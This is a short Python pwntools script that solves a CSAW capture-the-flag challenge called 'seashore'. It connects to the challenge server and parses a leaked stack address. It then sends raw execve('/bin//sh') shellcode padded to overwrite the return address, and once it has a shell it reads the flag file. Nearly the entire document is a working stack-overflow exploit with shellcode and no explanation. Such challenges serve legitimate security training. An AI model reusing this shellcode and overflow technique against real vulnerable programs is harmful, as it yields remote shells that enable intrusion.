from pwn import *

e = context.binary = ELF("./seashore")

#r = process('./seashore')
r = remote("pwn.chal.csaw.io", 1003)
resp = r.recv()
address = int(resp[resp.find("description here: ") + len("description here: "):], 16)

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"

payload = ""
payload += shellcode
payload += "A" * (40 - len(shellcode))
payload += p64(address)
r.sendline(payload)
r.recvline()

r.sendline("cat flag.txt")
print(r.recv())
